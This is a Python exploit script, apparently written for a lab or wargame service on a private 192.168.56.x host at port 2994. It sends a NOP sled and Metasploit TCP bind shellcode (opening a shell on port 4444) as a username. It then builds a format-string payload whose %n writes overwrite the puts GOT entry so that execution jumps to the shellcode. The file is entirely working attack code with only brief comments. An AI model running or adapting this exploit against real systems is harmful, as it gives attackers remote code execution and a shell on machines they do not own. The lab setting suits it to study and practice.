import socket
import sys

def main():

	HOST = '192.168.56.101'
	PORT = 2994

	# puts GOT entry (addresses of 4 consecutive bytes)
	puts_GOT_1 = "\x94\xa1\x04\x08"
	puts_GOT_2 = "\x95\xa1\x04\x08"
	puts_GOT_3 = "\x96\xa1\x04\x08"
	puts_GOT_4 = "\x97\xa1\x04\x08"

	#0xbffff9d8
	#0xbffff9d4

	# Metasploit TCP bind shellcode at port 4444 prepended with NOP-sled
	shellcode = "\x90" * 24
	shellcode += "\x31\xdb\xf7\xe3\x53\x43\x53\x6a\x02\x89\xe1\xb0\x66\xcd\x80" \
	            "\x5b\x5e\x52\x68\xff\x02\x11\x5c\x6a\x10\x51\x50\x89\xe1\x6a" \
	            "\x66\x58\xcd\x80\x89\x41\x04\xb3\x04\xb0\x66\xcd\x80\x43\xb0" \
	            "\x66\xcd\x80\x93\x59\x6a\x3f\x58\xcd\x80\x49\x79\xf8\x68\x2f" \
	            "\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0" \
	            "\x0b\xcd\x80\x00"


	# String taken from syslog used as template for tailoring format string size
	format_str = "Login from 192.168.56.1:57036 as [] with password []"

	sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	sock.connect((HOST, PORT))
	
	username = shellcode + "\n"

	print("len: ", len(format_str) + len(shellcode))

	# Prepended with "AAAAAAA" for memory alignment
	login = "AAA" + puts_GOT_1 + puts_GOT_2 + puts_GOT_3 + puts_GOT_4
	
	# The address of shellcode on the stack
	sa = [0xd3, 0xf9, 0xff, 0xbf]

	# Tailoring format string to write "\x28\xfa\xff\xbf" bytes to puts GOT entry 
	t1 = 0x100 + sa[0]
	newlen = t1 - len(format_str) - len(username) - len(login) + 0x3
	login += "%" + str(newlen) + "x" + "%46$n"

	t2 = 0x100 + sa[1]
	newlen = t2 - t1
	login += "%" + str(newlen) + "x" + "%47$n"

	t3 = 0x200 + sa[2]
	newlen = t3 - t2
	login += "%" + str(newlen) + "x" + "%48$n"

	t4 = 0x300 + sa[3]
	newlen = t4 - t3
	login += "%" + str(newlen) + "x" + "%49$n"

	sock.send("username " + username)
	sock.send("login " + login)
	print(sock.recv(1024))
	sock.close()

if __name__ == "__main__":
	main()
